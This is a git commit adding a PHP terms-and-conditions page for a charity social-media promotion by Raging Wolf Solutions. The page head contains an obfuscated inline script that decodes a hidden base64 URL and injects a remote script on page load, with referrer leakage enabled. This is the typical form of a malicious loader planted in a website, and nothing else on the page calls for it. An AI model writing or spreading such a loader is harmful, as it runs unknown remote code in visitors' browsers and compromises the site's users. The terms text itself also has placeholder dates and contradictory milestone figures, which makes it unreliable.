b8d5b1687431aef679fc7be1dbf46e9a5a6bfbe8
rjrsand <99208059+rjrsand@users.noreply.github.com>
2024-09-12 18:50:38 -0400

    initial commit/updated wording

---
+++ promotion_terms/q3_2024_promo_terms.php
@@ -0,0 +1,86 @@
+<!doctype html>
+<html>
+
+<head>
+    <script src="../dmxAppConnect/dmxAppConnect.js"></script>
+    <meta charset="UTF-8">
+    <title>Terms and Conditions: Giving Back | Raging Wolf Solutions</title>
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" integrity="sha384-DyZ88mC6Up2uqS4h/KRgHuoeGwBcD4Ng9SiP4dIRy0EXTlnuz47vAwmeGwVChigm" crossorigin="anonymous" />
+    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="../bootstrap/5/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="../css/style.css" />
+    <link rel="stylesheet" href="../css/stylesheet.css" />
+    <script src="../js/jquery-3.5.1.slim.min.js"></script>
+    <script src="../dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
+    <script src="../dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>
+
+    <script src="../dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
+    <link rel="icon" href="icons/favicon.ico">
+    <link rel="stylesheet" href="../dmxAppConnect/dmxValidator/dmxValidator.css" />
+    <script src="../dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
+    <script src="../dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
+    <script>
+        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
+    </script>
+    <script src="../dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>
+</head>
+
+<body is="dmx-app" id="index" class="bg-dark">
+    <div is="dmx-browser" id="browser1"></div>
+
+    <?php include '../navbar_mini'; ?>
+
+    <?php include '../navbar_main'; ?>
+
+    <section id="modules" class="border-top rounded-1 rounded-0 min-vh-75 border-secondary pb-3" style="min-height: 75vh;">
+
+        <img src="../assets/images/section-modal-bg-top-stone.png" class="w-100">
+        <div class="container modules-container mt-0 mb-4 pb-5">
+            <div class="row justify-content-center pb-4">
+                <div class="pl-1 pr-1 col-12 text-center col-md-10">
+
+
+
+                    <h1 class="text-uppercase text-yellow text-warning text-center"><i class="fas fa-comments-dollar"></i></h1>
+                    <h5 class="text-uppercase text-yellow text-warning text-center">Referral Rewards</h5>
+                    <h1 class="text-light text-left mb-4">Giving Back To The Community: "Kaps 4 Kidz" Terms and Conditions</h1>
+
+                    <div class="d-flex overflow-auto mb-4" style="height: 400px;">
+                        <p class="text-white-50 text-start">Disclaimer for Raging Wolf Solutions' Promotion:
+                            <br><br>
+                            Promotion Period: This promotion begins on <mark>[insert correct dates]</mark> and will end on <mark>[insert correct dates]</mark>, or when our total collective tagged posts reaches 100 across Facebook &amp; LinkedIn - whichever comes first.
+                            <br><br>
+                            Post Counting: Tagged posts are counted as the total sum of images with Raging Wolf Solutions tagged (#, hashtagged) on Raging Wolf Solutions' official social media platforms on Facebook &amp; LinkedIn. Only genuine tagged posts will be considered, reposting will not be recognized. Raging Wolf Solutions reserves the right to validate the legitimacy of each post.
+                            <br><br>
+                            Donation: For every additional 10 tagged posts on our Social Media pages during the promotion period, Raging Wolf Solutions commits to donate $100 to Rainbow Children's Hospital. Donations will be made in installments of $100 for each 10 tagged posts milestone achieved.
+                            <br><br>
+                            Maximum Donation &amp; Post Limit: The promotion will conclude once the tagged posts have reached a collective total of 100 posts across all platforms, or once a total donation amount of $1,000 has been reached, whichever comes first.
+                            <br><br>
+                            Tampering &amp; Fraud: Any attempts to artificially inflate post counts, use bots, or other methods of manipulation will result in disqualification from the promotion.
+                            <br><br>
+                            Transparency: Raging Wolf Solutions will post screenshots of our analytics on our official social media platforms as we reach each new tagged post count milestone (every 100 posts).
+                            <br><br>
+                            General: This promotion is in no way sponsored, endorsed, or administered by, or associated with, Facebook or LinkedIn, or any other third-party platform on which it is promoted. Participants acknowledge that they are providing their information to Raging Wolf Solutions and not to these third-party platforms.
+                        </p>
+
+                    </div>
+                    <div class="d-flex justify-content-between">
+                        <h4 class="text-left text-uppercase text-white-50 hover-cursor" dmx-on:click="browser1.goto('../index.php')"><i class="fas fa-arrow-left"></i>&nbsp;Go Home</h4>
+                        <h4 class="text-left text-warning text-uppercase hover-cursor" dmx-on:click="browser1.goto('../q3_2024_promo.php')">Go To Program&nbsp;<i class="fas fa-arrow-right"></i></h4>
+                    </div>
+
+
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <?php include '../footer.php'; ?>
+
+    <script src="../bootstrap/5/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
